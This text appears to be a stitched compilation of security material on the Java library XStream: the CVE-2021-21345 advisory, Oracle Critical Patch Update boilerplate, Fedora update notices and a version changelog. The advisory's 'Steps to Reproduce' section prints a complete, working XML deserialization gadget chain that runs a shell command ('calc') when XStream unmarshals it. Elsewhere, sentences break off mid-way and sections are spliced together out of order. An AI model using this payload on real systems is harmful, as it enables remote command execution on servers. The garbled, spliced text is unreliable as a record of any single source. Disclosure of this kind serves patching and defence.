Oracle Fusion Middleware products include Oracle Database components that are affected by the vulnerabilities listed in the Oracle Database section. The exposure of Oracle Fusion Middleware products is dependent on the Oracle Database version being used. Oracle Database security updates are not listed in the Oracle Fusion Middleware risk matrix. However, since vulnerabilities affecting Oracle Database versions may affect Oracle Fusion Middleware products, Oracle recommends that customers apply the Critical Patch Update October 2021 to the Oracle Database components of Oracle Fusion Middleware products. For information on what patches need to be applied to your environments, refer to Critical Patch Update October 2021 Patch Availability Document for Oracle Products, [My Oracle Support Note 2796575.1](https://support.oracle.com/rs?type=doc&id=2796575.1).

# CVE-2021-21345

## Vulnerability

CVE-2021-21345: XStream is vulnerable to a Remote Command Execution attack.

## Affected Versions

All versions until and including version 1.4.15 are affected, if using the version out of the box. No user is
affected, who followed the recommendation to setup [XStream's security
framework](security.html#framework) with a whitelist limited to the minimal required types.

## Description

The processed stream at unmarshalling time contains type information to recreate the formerly written objects.
XStream creates therefore new instances based on these type information. An attacker can manipulate the processed
input stream and replace or inject objects, that result in execution of a local command on the server.

## Steps to Reproduce

Create a simple PriorityQueue and use XStream to marshal it to XML. Replace the XML with following snippet and
unmarshal it again with XStream:

```
<java.util.PriorityQueue serialization='custom'>
  <unserializable-parents/>
  <java.util.PriorityQueue>
    <default>
      <size>2</size>
      <comparator class='sun.awt.datatransfer.DataTransferer$IndexOrderComparator'>
        <indexMap class='com.sun.xml.internal.ws.client.ResponseContext'>
          <packet>
            <message class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart'>
              <dataSource class='com.sun.xml.internal.ws.message.JAXBAttachment'>
                <bridge class='com.sun.xml.internal.ws.db.glassfish.BridgeWrapper'>
                  <bridge class='com.sun.xml.internal.bind.v2.runtime.BridgeImpl'>
                    <bi class='com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl'>
                      <jaxbType>com.sun.corba.se.impl.activation.ServerTableEntry</jaxbType>
                      <uriProperties/>
                      <attributeProperties/>
                      <inheritedAttWildcard class='com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection'>
                        <getter>
                          <class>com.sun.corba.se.impl.activation.ServerTableEntry</class>
                          <name>verify</name>
                          <parameter-types/>
                        </getter>
                      </inheritedAttWildcard>
                    </bi>
                    <tagName/>
                    <context>
                      <marshallerPool class='com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1'>
                        <outer-class reference='../..'/>
                      </marshallerPool>
                      <nameList>
                        <nsUriCannotBeDefaulted>
                          <boolean>true</boolean>
                        </nsUriCannotBeDefaulted>
                        <namespaceURIs>
                          <string>1</string>
                        </namespaceURIs>
                        <localNames>
                          <string>UTF-8</string>
                        </localNames>
                      </nameList>
                    </context>
                  </bridge>
                </bridge>
                <jaxbObject class='com.sun.corba.se.impl.activation.ServerTableEntry'>
                  <activationCmd>calc</activationCmd>
                </jaxbObject>
              </dataSource>
            </message>
            <satellites/>
            <invocationProperties/>
          </packet>
        </indexMap>
      </comparator>
    </default>
    <int>3</int>
    <string>javax.xml.ws.binding.attachments.inbound</string>
    <string>javax.xml.ws.binding.attachments.inbound</string>
  </java.util.PriorityQueue>
</java.util.PriorityQueue>

```

```
XStream xstream = new XStream();
xstream.fromXML(xml);

```

As soon as the XML gets unmarshalled, the payload gets executed and the command is executed on the host.

Note, this example uses XML, but the attack can be performed for any supported format. e.g. JSON.

## Impact

The vulnerability may allow a remote attacker has sufficient rights to execute commands of the host only by
manipulating the processed input stream.

## Workarounds

See [workarounds](security.html#workaround) for the different versions covering all CVEs.

Fedora Update Notification
FEDORA-2021-5e376c0ed9
2021-10-29 22:48:33.389333
--------------------------------------------------------------------------------

Name : xstream
Product : Fedora 35
Version : 1.4.18
Release : 2.fc35
URL : <https://x-stream.github.io>
Summary : Java XML serialization library
Description :
XStream is a simple library to serialize objects to XML
and back again. A high level facade is supplied that
simplifies common use cases. Custom objects can be serialized
without need for specifying mappings. Speed and low memory
footprint are a crucial part of the design, making it suitable
for large object graphs or systems with high message throughput.
No information is duplicated that can be obtained via reflection.
This results in XML that is easier to read for humans and more
compact than native Java serialization. XStream serializes internal
fields, including private and final. Supports non-public and inner
classes. Classes are not required to have default constructor.
Duplicate references encountered in the object-model will be
maintained. Supports circular references. By implementing an
interface, XStream can serialize directly to/from any tree
structure (not just XML). Strategies can be registered allowing
customization of how particular types are represented as XML.
When an exception occurs due to malformed XML, detailed diagnostics
are provided to help isolate and fix the problem.

Fedora Update Notification
FEDORA-2021-d894ca87dc
2021-10-12 23:37:48.488199
--------------------------------------------------------------------------------

Name : xstream
Product : Fedora 34
Version : 1.4.18
Release : 2.fc34
URL : <https://x-stream.github.io>
Summary : Java XML serialization library
Description :
XStream is a simple library to serialize objects to XML
and back again. A high level facade is supplied that
simplifies common use cases. Custom objects can be serialized
without need for specifying mappings. Speed and low memory
footprint are a crucial part of the design, making it suitable
for large object graphs or systems with high message throughput.
No information is duplicated that can be obtained via reflection.
This results in XML that is easier to read for humans and more
compact than native Java serialization. XStream serializes internal
fields, including private and final. Supports non-public and inner
classes. Classes are not required to have default constructor.
Duplicate references encountered in the object-model will be
maintained. Supports circular references. By implementing an
interface, XStream can serialize directly to/from any tree
structure (not just XML). Strategies can be registered allowing
customization of how particular types are represented as XML.
When an exception occurs due to malformed XML, detailed diagnostics
are provided to help isolate and fix the problem.

## Oracle Critical Patch Update Advisory - April 2021

### Description

A Critical Patch Update is a collection of patches for multiple security vulnerabilities.  These patches address vulnerabilities in Oracle code and in third-party components included in Oracle products.  These patches are usually cumulative, but each advisory describes only the security patches added since the previous Critical Patch Update Advisory. Thus, prior Critical Patch Update advisories should be reviewed for information regarding earlier published security patches.  Refer to [“Critical Patch Updates, Security Alerts and Bulletins”](https://www.oracle.com/security-alerts/) for information about Oracle Security advisories.

**Oracle continues to periodically receive reports of attempts to maliciously exploit vulnerabilities for which Oracle has already released security patches. In some instances, it has been reported that attackers have been successful because targeted customers had failed to apply available Oracle patches. Oracle therefore strongly recommends that customers remain on actively-supported versions and apply Critical Patch Update security patches without delay.**

This Critical Patch Update contains 391 new security patches across the product families listed below. Please note that an MOS note summarizing the content of this Critical Patch Update and other Oracle Software Security Assurance activities is located at  [April 2021 Critical Patch Update: Executive Summary and Analysis](https://support.oracle.com/rs?type=doc&id=2765149.1).

#### Note:

* Vulnerabilities affecting either Oracle Database or Oracle Fusion Middleware may affect Oracle Fusion Applications, so Oracle customers should refer to Oracle Fusion Applications Critical Patch Update Knowledge Document, [My Oracle Support Note 1967316.1](https://support.oracle.com/rs?type=doc&id=1967316.1) for information on patches to be applied to Fusion Application environments.
* Vulnerabilities affecting Oracle Solaris may affect Oracle ZFSSA so Oracle customers should refer to the Oracle and Sun Systems Product Suite Critical Patch Update Knowledge Document, [My Oracle Support Note 2160904.1](https://support.oracle.com/rs?type=doc&id=2160904.1) for information on minimum revisions of security patches required to resolve ZFSSA issues published in Critical Patch Updates and Solaris Third Party bulletins.
* Solaris Third Party Bulletins are used to announce security patches for third party software distributed with Oracle Solaris. Solaris 10 customers should refer to the latest patch-sets which contain critical security fixes and detailed in Systems Patch Availability Document. Please see Reference Index of CVE IDs and Solaris Patches ([My Oracle Support Note 1448883.1](https://support.oracle.com/rs?type=doc&id=1448883.1)) for more information.
* Users running Java SE with a browser can download the latest release from <https://java.com>. Users on the Windows and Mac OS X platforms can also use [automatic updates](https://www.java.com/en/download/help/java_update.xml) to get the latest release.

### Risk Matrix Content

Risk matrices list only security vulnerabilities that are newly addressed by the patches associated with this advisory. Risk matrices for previous security patches can be found in [previous Critical Patch Update advisories and Alerts](https://www.oracle.com/security-alerts). An English text version of the risk matrices provided in this document is  [here](/security-alerts/cpuapr2021verbose.html).

Several vulnerabilities addressed in this Critical Patch Update affect multiple products. Each vulnerability is identified by a [CVE#](https://cve.mitre.org/) which is its unique identifier. A vulnerability that affects multiple products will appear with the same CVE# in all risk matrices. A CVE# shown in *italics* indicates that this vulnerability impacts a different product, but also has impact on the product where the italicized CVE# is listed.

Security vulnerabilities are scored using CVSS version 3.1 (see [Oracle CVSS Scoring](/security-alerts/cvssscoringsystem.html) for an explanation of how Oracle applies CVSS version 3.1).

Oracle conducts an analysis of each security vulnerability addressed by a Critical Patch Update. Oracle does not disclose detailed information about this security analysis to customers, but the resulting Risk Matrix and associated documentation provide information about the type of vulnerability, the conditions required to exploit it, and the potential impact of a successful exploit. Oracle provides this information, in part, so that customers may conduct their own risk analysis based on the particulars of their product usage. For more information, see [Oracle vulnerability disclosure policies](https://www.oracle.com/us/support/assurance/disclosure-policies/index.html).

Oracle lists updates that address vulnerabilities in third-party components that are not exploitable in the context of their inclusion in their respective Oracle product beneath the product's risk matrix.

The protocol in the risk matrix implies that all of its secure variants (if applicable) are affected as well. For example, if HTTP is listed as an affected protocol, it implies that HTTPS (if applicable) is also affected. The secure variant of a protocol is listed in the risk matrix only if it is the *only* variant affected, e.g. HTTPS will typically be listed for vulnerabilities in SSL and TLS.

### Workarounds

**Due to the threat posed by a successful attack, Oracle strongly recommends that customers apply Critical Patch Update security patches as soon as possible**. Until you apply the Critical Patch Update patches, it may be possible to reduce the risk of successful attack by blocking network protocols required by an attack. For attacks that require certain privileges or access to certain packages, removing the privileges or the ability to access the packages from users that do not need the privileges may help reduce the risk of successful attack. Both approaches may break application functionality, so Oracle strongly recommends that customers test changes on non-production systems. Neither approach should be considered a long-term solution as neither corrects the underlying problem.

### Skipped Critical Patch Updates

Oracle strongly recommends that customers apply security patches as soon as possible. For customers that have skipped one or more Critical Patch Updates and are concerned about products that do not have security patches announced in this Critical Patch Update, please review [previous Critical Patch Update advisories](https://www.oracle.com/security-alerts) to determine appropriate actions.

### Critical Patch Update Supported Products and Versions

Patches released through the Critical Patch Update program are provided only for product versions that are covered under the Premier Support or Extended Support phases of the  [Lifetime Support Policy](https://www.oracle.com/us/support/lifetime-support/index.html?ssSourceSiteId=otnen). Oracle recommends that customers plan product upgrades to ensure that patches released through the Critical Patch Update program are available for the versions they are currently running.

Product releases that are not under Premier Support or Extended Support are not tested for the presence of vulnerabilities addressed by this Critical Patch Update. However, it is likely that earlier versions of affected releases are also affected by these vulnerabilities. As a result, Oracle recommends that customers upgrade to supported versions.

Database, Fusion Middleware, and Oracle Enterprise Manager products are patched in accordance with the Software Error Correction Support Policy explained in [My Oracle Support Note 209768.1](https://support.oracle.com/rs?type=doc&id=209768.1). Please review the [Technical Support Policies](https://www.oracle.com/us/support/policies/index.html?ssSourceSiteId=otnen) for further guidelines regarding support policies and phases of support.

## Oracle Critical Patch Update Advisory - January 2022

### Description

A Critical Patch Update is a collection of patches for multiple security vulnerabilities.  These patches address vulnerabilities in Oracle code and in third-party components included in Oracle products.  These patches are usually cumulative, but each advisory describes only the security patches added since the previous Critical Patch Update Advisory. Thus, prior Critical Patch Update advisories should be reviewed for information regarding earlier published security patches.  Refer to [“Critical Patch Updates, Security Alerts and Bulletins”](https://www.oracle.com/security-alerts/) for information about Oracle Security advisories.

**Oracle continues to periodically receive reports of attempts to maliciously exploit vulnerabilities for which Oracle has already released security patches. In some instances, it has been reported that attackers have been successful because targeted customers had failed to apply available Oracle patches. Oracle therefore strongly recommends that customers remain on actively-supported versions and apply Critical Patch Update security patches without delay.**

This Critical Patch Update contains 497 new security patches across the product families listed below. Please note that an MOS note summarizing the content of this Critical Patch Update and other Oracle Software Security Assurance activities is located at  [January 2022 Critical Patch Update: Executive Summary and Analysis](https://support.oracle.com/rs?type=doc&id=2832416.1).

**Please note that on December 10, 2021, Oracle released a Security Alert for Apache Log4j vulnerabilities [CVE-2021-44228 and CVE-2021-45046](https://www.oracle.com/security-alerts/alert-cve-2021-44228.html). Customers should review the Alert if they have not already done so.**

#### Note:

* Vulnerabilities affecting either Oracle Database or Oracle Fusion Middleware may affect Oracle Fusion Applications, so Oracle customers should refer to Oracle Fusion Applications Critical Patch Update Knowledge Document, [My Oracle Support Note 1967316.1](https://support.oracle.com/rs?type=doc&id=1967316.1) for information on patches to be applied to Fusion Application environments.
* Vulnerabilities affecting Oracle Solaris may affect Oracle ZFSSA so Oracle customers should refer to the Oracle and Sun Systems Product Suite Critical Patch Update Knowledge Document, [My Oracle Support Note 2160904.1](https://support.oracle.com/rs?type=doc&id=2160904.1) for information on minimum revisions of security patches required to resolve ZFSSA issues published in Critical Patch Updates and Solaris Third Party bulletins.
* Solaris Third Party Bulletins are used to announce security patches for third party software distributed with Oracle Solaris. Solaris 10 customers should refer to the latest patch-sets which contain critical security patches detailed in Systems Patch Availability Document. Please see Reference Index of CVE IDs and Solaris Patches ([My Oracle Support Note 1448883.1](https://support.oracle.com/rs?type=doc&id=1448883.1)) for more information.
* Users running Java SE with a browser can download the latest release from <https://java.com>. Users on the Windows and Mac OS X platforms can also use [automatic updates](https://www.java.com/en/download/help/java_update.xml) to get the latest release.

### Risk Matrix Content

Risk matrices list only security vulnerabilities that are newly addressed by the patches associated with this advisory. Risk matrices for previous security patches can be found in [previous Critical Patch Update advisories and Alerts](https://www.oracle.com/security-alerts). An English text version of the risk matrices provided in this document is  [here](/security-alerts/cpujan2022verbose.html).

Several vulnerabilities addressed in this Critical Patch Update affect multiple products. Each vulnerability is identified by a [CVE#](https://cve.mitre.org/) which is its unique identifier. A vulnerability that affects multiple products will appear with the same CVE# in all risk matrices. A CVE# shown in *italics* indicates that this vulnerability impacts a different product, but also has impact on the product where the italicized CVE# is listed.

Security vulnerabilities are scored using CVSS version 3.1 (see [Oracle CVSS Scoring](/security-alerts/cvssscoringsystem.html) for an explanation of how Oracle applies CVSS version 3.1).

Oracle conducts an analysis of each security vulnerability addressed by a Critical Patch Update. Oracle does not disclose detailed information about this security analysis to customers, but the resulting Risk Matrix and associated documentation provide information about the type of vulnerability, the conditions required to exploit it, and the potential impact of a successful exploit. Oracle provides this information, in part, so that customers may conduct their own risk analysis based on the particulars of their product usage. For more information, see [Oracle vulnerability disclosure policies](https://www.oracle.com/us/support/assurance/disclosure-policies/index.html).

Oracle lists updates that address vulnerabilities in third-party components that are not exploitable in the context of their inclusion in their respective Oracle product beneath the product's risk matrix.

The protocol in the risk matrix implies that all of its secure variants (if applicable) are affected as well. For example, if HTTP is listed as an affected protocol, it implies that HTTPS (if applicable) is also affected. The secure variant of a protocol is listed in the risk matrix only if it is the *only* variant affected, e.g. HTTPS will typically be listed for vulnerabilities in SSL and TLS.

### Workarounds

**Due to the threat posed by a successful attack, Oracle strongly recommends that customers apply Critical Patch Update security patches as soon as possible**. Until you apply the Critical Patch Update patches, it may be possible to reduce the risk of successful attack by blocking network protocols required by an attack. For attacks that require certain privileges or access to certain packages, removing the privileges or the ability to access the packages from users that do not need the privileges may help reduce the risk of successful attack. Both approaches may break application functionality, so Oracle strongly recommends that customers test changes on non-production systems. Neither approach should be considered a long-term solution as neither corrects the underlying problem.

### Skipped Critical Patch Updates

Oracle strongly recommends that customers apply security patches as soon as possible. For customers that have skipped one or more Critical Patch Updates and are concerned about products that do not have security patches announced in this Critical Patch Update, please review [previous Critical Patch Update advisories](https://www.oracle.com/security-alerts) to determine appropriate actions.

### Critical Patch Update Supported Products and Versions

Patches released through the Critical Patch Update program are provided only for product versions that are covered under the Premier Support or Extended Support phases of the  [Lifetime Support Policy](https://www.oracle.com/us/support/lifetime-support/index.html?ssSourceSiteId=otnen). Oracle recommends that customers plan product upgrades to ensure that patches released through the Critical Patch Update program are available for the versions they are currently running.

Product releases that are not under Premier Support or Extended Support are not tested for the presence of vulnerabilities addressed by this Critical Patch Update. However, it is likely that earlier versions of affected releases are also affected by these vulnerabilities. As a result, Oracle recommends that customers upgrade to supported versions.

Database, Fusion Middleware, and Oracle Enterprise Manager products are patched in accordance with the Software Error Correction Support Policy explained in [My Oracle Support Note 209768.1](https://support.oracle.com/rs?type=doc&id=209768.1). Please review the [Technical Support Policies](https://www.oracle.com/us/support/policies/index.html?ssSourceSiteId=otnen) for further guidelines regarding support policies and phases of support.

Fedora Update Notification
FEDORA-2021-fbad11014a
2021-10-12 23:45:00.369090
--------------------------------------------------------------------------------

Name : xstream
Product : Fedora 33
Version : 1.4.18
Release : 2.fc33
URL : <https://x-stream.github.io>
Summary : Java XML serialization library
Description :
XStream is a simple library to serialize objects to XML
and back again. A high level facade is supplied that
simplifies common use cases. Custom objects can be serialized
without need for specifying mappings. Speed and low memory
footprint are a crucial part of the design, making it suitable
for large object graphs or systems with high message throughput.
No information is duplicated that can be obtained via reflection.
This results in XML that is easier to read for humans and more
compact than native Java serialization. XStream serializes internal
fields, including private and final. Supports non-public and inner
classes. Classes are not required to have default constructor.
Duplicate references encountered in the object-model will be
maintained. Supports circular references. By implementing an
interface, XStream can serialize directly to/from any tree
structure (not just XML). Strategies can be registered allowing
customization of how particular types are represented as XML.
When an exception occurs due to malformed XML, detailed diagnostics
are provided to help isolate and fix the problem.

* [#359](https://github.com/x-stream/xstream/issues/359): Add KEYS file with public keys to verify signed artifacts.
* Detect input manipulation in c.t.x.io.binary.BinaryStreamReader.
* Use Jettison 1.5.4 by default for Java Runtimes version 8 or higher.

## API changes

* Added constant c.t.x.io.xml.PrettyPrintWriter.XML\_1\_0\_REPLACEMENT.
* Added constant c.t.x.io.xml.PrettyPrintWriter.XML\_1\_1\_REPLACEMENT.
* Added c.t.x.converters.collections.WeakHashMapConverter.
* Protected field *fieldsToOmit* of c.t.x.mapper.ElementIgnoringMapper set to private.
* Protected field *unknownElementsToIgnore* of c.t.x.mapper.ElementIgnoringMapper set to private.

## Stream compatibility

* The WeakHashMaps, that have been written with previous versions of XStream, can still be deserialized.

# 1.4.20

Released December 24, 2022.

This maintenance release addresses the security vulnerabilities
[CVE-2022-40151](CVE-2022-40151.html) and [CVE-2022-41966](CVE-2022-41966.html), causing a

# 1.4.19

Released January 29, 2022.

This maintenance release addresses the security vulnerability
[CVE-2021-43859](CVE-2021-43859.html), when unmarshalling highly recursive collections or maps causing a
Denial of Service.

## API changes

* Added c.t.x.XStream.COLLECTION\_UPDATE\_LIMIT and c.t.x.XStream.COLLECTION\_UPDATE\_SECONDS.
* Added c.t.x.XStream.setCollectionUpdateLimit(int).
* Added c.t.x.core.SecurityUtils.
* Added c.t.x.security.AbstractSecurityException and c.t.x.security.InputManipulationException.
* c.t.x.security.InputManipulationException derives now from c.t.x.security.AbstractSecurityException.

# 1.4.18

Released August 22, 2021.

This maintenance release addresses following security vulnerabilities, when unmarshalling with
an XStream instance using the default blacklist of an uninitialized security framework. XStream is therefore now
using a whitelist by default.

## Minor changes

* [#233](https://github.com/x-stream/xstream/issues/233): Support serializable types with non-serializable parent with PureJavaReflectionConverter.

## Stream compatibility

Starting with version 1.14.12 nine years ago, XStream contains a
[Security Framework](security.html#framework) to implement a black- or whitelist for the allowed types
at deserialization time. Until version 1.4.17, XStream kept a default blacklist in order to deny all types of the
Java runtime, which are used for all kinds of [security attacks](security.html#CVEs), in order to
guarantee optimal runtime compatibility for existing users. However, this approach has failed. The last months
have shown, that the Java runtime alone contains dozens of types that can be used for an attack, not even looking
at the 3rd party libraries on a classpath. The new version of XStream uses therefore now by default a whitelist,
which is recommended since nine years. It also has been complaining on the console for a long time about an
uninitialized security framework the first time it was run. Anyone who has followed the advice and initialized the
security framework for their own scenario can easily update to the new version without any problem. Everyone else
will have to do a proper initialization now, otherwise the new version will fail with certainty at deserialization
time.

# 1.4.17

Released May 13, 2021.

This maintenance release addresses the security vulnerability
[CVE-2021-29505](CVE-2021-29505.html), when unmarshalling with XStream instance using an uninitialized
security framework.

## Stream compatibility

* The following types are now blacklisted by default and the deserialization
  of XML containing one of the two types will fail. You will have to enable these types by explicit
  configuration, if you need them:
  + any type in the java.rmi.\* and sun.rmi.\* package hierarchies
  + the individual type com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl

# 1.4.16

Released March 13, 2021.

This maintenance release switches XStream's default parser and addresses following security
vulnerabilities, when unmarshalling with an XStream instance using an uninitialized security framework.

* [CVE-2021-21341](CVE-2021-21341.html)
* [CVE-2021-21342](CVE-2021-21342.html)
* [CVE-2021-21343](CVE-2021-21343.html)
* [CVE-2021-21344](CVE-2021-21344.html)

* [CVE-2021-21349](CVE-2021-21349.html)
* [CVE-2021-21350](CVE-2021-21350.html)
* [CVE-2021-21351](CVE-2021-21351.html)

## Major changes

* Switch from Xpp3 as default parser to MXParser, a fork of Xpp3.

## Minor changes

* [#238](https://github.com/x-stream/xstream/issues/238): Fix possibility to process references on enum types at deserialization.
* [#237](https://github.com/x-stream/xstream/issues/237): Fix optimization in XmlFriendlyNameCoder.

## Stream compatibility

* The following types are now blacklisted by default and the deserialization
  of XML containing one of the two types will fail. You will have to enable these types by explicit
  configuration, if you need them:

## Dependencies

The default parser of XStream has changed from the Xpp3Parser in artifact xpp3:xpp3\_min to MXParser, a fork of
Xpp3 in the artifact io.github.x-stream:mxparser. The Xpp3 is unmaintained for a long time, bugs have been fixed
reported more than a decade ago, improvements by other forks have been incorporated and some endless loops have
been fixed, that could have been utilized as DoS attack.

XStream has therefore new default dependencies. If you have used XStream with the default driver (i.e. Xpp3),
you can still exchange the XStream library for a drop-in replacement, but you will also have to remove the Xpp3 and
add the MXParser library instead.

For build time you will have to add the Xpp3 library to your dependencies, if you made explicitly use of the
Xpp3 driver. If you did explicitly use a different driver than Xpp3 and had therefore excluded the Xpp3
dependency, you might have to exclude now the new MXParser dependency instead to minimize your dependency list.

# 1.4.15

Released December 13, 2020.

This maintenance release addresses the security vulnerabilities
[CVE-2020-26258](CVE-2020-26258.html) and [CVE-2020-26259](CVE-2020-26259.html), when
unmarshalling with XStream instance using an uninitialized security framework.

## Minor changes

* [#226](https://github.com/x-stream/xstream/issues/226): XmlFriendlyNameCoder does not accept '9' as valid character in an XML name.
* [#228](https://github.com/x-stream/xstream/pull/228): DefaultMapper should handle IllegalArgumentException thrown by Class.forName().

## Stream compatibility

* The type jdk.nashorn.internal.objects.NativeString and the internal JAX-WS type ReadAllStream.FileStream
  are now part of the default blacklist and the deserialization of XML containing one of the two types will fail.
  You will have to enable these types by explicit configuration, if you need them.

## Delivery

Any XStream release can run with a minimal Java runtime environment of Java 1.4 as long as this environment will
process only requested classes of the jar file. Until version 1.4.14 XStream was delivered also as special Java 7
version for Android, because Dalvik scans all classes and fails at classes requiring a higher runtime version. However, this
special version will not work in a normal Java 8 environment or higher and was never meant do so.

Unfortunately, this version has to be build always after the standard version due to the build sequence. The
latest version in Maven Central however is always the one that has been deployed last independently from the time
of publishing. This creates an annoyance now in GitHub for any project using the Dependabot service which creates
automated pull requests with updates to the latest XStream version, because it injects now the special Java 7
version that probably breaks these projects.

Users who still require a special version for Java 7 will have to build this artifact now on their own. Users
for even older Java environments had always to do so anyway.

# 1.4.14

Released November 16, 2020.

This maintenance release addresses the security vulnerability
[CVE-2020-26217](CVE-2020-26217.html), reported originally as CVE-2017-9805 for Struts' XStream Plugin,
an arbitrary execution of commands when unmarshalling with XStream instances using an uninitialized security
framework.

## Stream compatibility

* The types java.lang.ProcessBuilder and javax.imageio.ImageIO$ContainsFilter are now part of the default
  blacklist and the deserialization of XML containing one of the two types will fail. You will have to enable
  these types by explicit configuration, if you need them.

# 1.4.13

Released September 6, 2020.

## Major changes

* [#218](https://github.com/x-stream/xstream/pull/218): Defer reflective access to Java core modules.
* [#207](https://github.com/x-stream/xstream/issues/207): New predefined blacklist avoids vulnerability due to improper setup of the security framework.

# 1.4.12

Released April 12, 2020.

## Minor changes

* XmlFriendlyNameCoder supports now XML parsers implementing only 4th edition of XML 1.0 specification.
* Fix support of CDATA events in StAX.
* [#171](https://github.com/x-stream/xstream/issues/171): XStream.createObjectInputStream does not pass the DataHolder.
* [#151](https://github.com/x-stream/xstream/issues/151): Use of SPDX license identifier in POM and Manifest.
* [#152](https://github.com/x-stream/xstream/issues/152): Declare OSGi import of internal runtime packages as optional.
* Drop Require-Capability entry in manifest.

# 1.4.11.1

Released October 27, 2018.

## Hot fix

* [#133](https://github.com/x-stream/xstream/issues/133): XStream 1.4.11 fails to run on a Java Runtime < 8.

# 1.4.11

Released October 23, 2018.

This maintenance release addresses again the security vulnerability [CVE-2013-7285](CVE-2013-7285.html), an arbitrary execution of commands when unmarshalling with XStream instances using an
uninitialized security framework. Only 1.4.10 uninitialized security framework was affected.

## Minor changes

* [#91](https://github.com/x-stream/xstream/pull/91), [#106](https://github.com/x-stream/xstream/pull/106): Clean-up data stacks in UnmarshallingContext implementations in case of exception (by
  Märt Bakhoff).
* [#2](https://github.com/x-stream/xstream/issues/2): Unneeded contention in DefaultConverterLookup.
* [#94](https://github.com/x-stream/xstream/issues/94): Fix PathConverter containing absolute Windows paths.
* [#105](https://github.com/x-stream/xstream/issues/105): XStream's ObjectInputStream returns wrong values for readUnsignedByte and readUnsignedShort.
* [XSTR-616](/jira/616) and [#93](https://github.com/x-stream/xstream/pull/93): Introduce StringCodec interface to support arbitrary Base64 codec
  implementations for EncodedByteArrayConverter. Prefer Base64 codec implementations of the Java runtime over
  XStream's own one.
* [#97](https://github.com/x-stream/xstream/issues/97): Support to run out of the box in a Java 1.4 runtime is established again.
* Provide methods in AbstractCollectionConverter that read and write in a balanced way from and to the
  hierarchical stream.
* New future-proof method JVM.isVersion to detect major version of Java runtime (incl. Java 10) as
  replacement for individual JVM.isXY methods.
* [#115](https://github.com/x-stream/xstream/issues/115): Dom4JDriver ignores character set of Dom4J configuration creating a Writer.
* [#116](https://github.com/x-stream/xstream/issues/116): Make converters null safe.
* [#123](https://github.com/x-stream/xstream/issues/123) and [#124](https://github.com/x-stream/xstream/pull/124): Declare XPP dependencies for OSGi as optional.
* Add XppDriver.createDefaultParser for a simpler access to the default XmlPullParserFactory.
* Old BEA reference implementation of StAX is outdated, unmaintained and has security issues, therefore
  XStream's driver has been deprecated.
* Support for JaCoCo: FieldDictionary ignores synthetic fields starting with *$jacoco* as name.
* Add integration test for OSGi (by Wes Wannemacher).

## Stream compatibility

* The EncodedByteArrayConverter will now use an encoder by default that does no longer add line breaks as
  normally required by the RFC 1521 after 76 characters, making it also easier to use the converter for
  attributes. This will not affect XStream's Base64 decoder.

## API changes

  known exploits.

## Stream Compatibility

* The alias *duration* for type *javax.xml.datatype.Duration* has changed to *xml-duration*
  due to the support of the classes in the java.time package. *duration* is now used for type *java.time.Duration*.
  Simply register the alias *duration* again for type *javax.xml.datatype.Duration* if backward
  compatibility is required for this type.

# 1.4.7

Released February 8, 2014.

This maintenance release addresses mainly the security vulnerability [CVE-2013-7285](CVE-2013-7285.html), an arbitrary execution of commands when unmarshalling.

## Major changes

* Add [security framework](security.html#framework) to limit handled types while unmarshalling.
* java.bean.EventHandler no longer handled automatically because of severe security vulnerability.
* [XSTR-751](/jira/751): New SunLimitedUnsafeReflectionProvider that uses undocumented features only to allocate new
  instances as required on Dalvik.
* Fix instantiation of AnnotationMapper that requires ConverterLookup and ConverterRegistry to be the same
  instance.

## Minor changes

* XSTR-749: NPE if ReflectionConverter.canConvert(type) is called with null as argument.
* XSTR-753: NPE if SerializationConverter.canConvert(type) is called with an interface type as argument that
  extends Serializable.
* Add constructor to ReflectionConverter taking an additional type to create an instance that is dedicated to a

# 1.4.6

Released December 12, 2013.

## Major changes

* [XSTR-566](/jira/566) and [XSTR-200](/jira/200): Better compatibility with GAE and environments with active SecurityManager
  (i.e. in an Applet). XStream converters try now to ensure already in the canConvert methods that they can handle the
  requested type in practice and not only theoretically. Additionally the implementations even better take care, that
  the initialization of a converter will not break the setup of XStream itself. Following modifications have been done
  for these topics:
  + ReflectionConverter, SerializationConverter and LookAndFieldConverter will check if they can access the
    fields by reflection for a requested type.
  + SerializationConverter and ExternalizableConverter will check if they can create an instance of a derived
    OutputObjectStream first.
  + BeanProvider does no longer use reflection to locate default constructor.
  + AbstractAttributedCharacterIteratorAttributeConverter (and therefore TextAttributeConverter) will check
    first if it can access the possible constants of the type by reflection.
  + NoClassDefFoundError raised in GAE accessing the fields of restricted types by reflection will be handled.
  + StackTraceElementConverter uses constructor for StackTraceElement instances in Java 5 and GEA.
* [XSTR-739](/jira/739) and [XSTR-746](/jira/746): OrderRetainingMap fails if HashMap.putAll(Map) of Java Runtime is not
  implemented calling put for every element within the map.
* New NamedArrayConverter to define names of inner elements.

## Minor changes

* [XSTR-747](/jira/747): All constructors of StaxDriver derived classes take erroneously a XmlFriendlyNameCoder instead
  of a plain NameCoder.

## API changes

* Added c.t.x.converters.extended.NamedArrayConverter for free element names in arrays.
* Added constructors to c.t.x.io.xml.StandardStaxDriver taking NameCoder instead of XmlFriendlyNameCoder.
* Deprecated constructors of c.t.x.io.xml.StandardStaxDriver taking a XmlFriendlyNameCoder.
* Added constructors to c.t.x.io.xml.BEAStaxDriver taking NameCoder instead of XmlFriendlyNameCoder.

* Added constructors to c.t.x.io.xml.WstxDriver taking NameCoder instead of XmlFriendlyNameCoder.
* Deprecated constructors of c.t.x.io.xml.WstxDriver taking a XmlFriendlyNameCoder.
* Added method canAccess to c.t.x.converter.reflection.AbstractReflectionConverter.

* [XSTR-732](/jira/732): Use a referencing implementation for the ClassLoader to support environments where no new
  ClassLoader can be instantiated due to security restrictions.
* [XSTR-691](/jira/691): Allow unknown XML elements to be ignored using new method XStream.ignoreUnknownElements.

  XStream 1.4.
* [XSTR-300](/jira/300): New EnumToStringConverter to support custom string representations of Enum values.
* [XSTR-292](/jira/292) and [XSTR-405](/jira/405): New NamedMapConverter and NamedCollectionConverter to define names of inner
  elements.
* [XSTR-726](/jira/726): New annotation XStreamAliasType to support declarative definition of XStream.aliasType().
* [XSTR-735](/jira/735): Support for JDOM2 with JDom2Driver, JDom2Reader and JDom2Writer.
* Optimized XML structure for java.awt.Font.
* Fix: ToAttributedValueConverter silently appends fields without attribute support to the value producing
  mixed-mode XML.

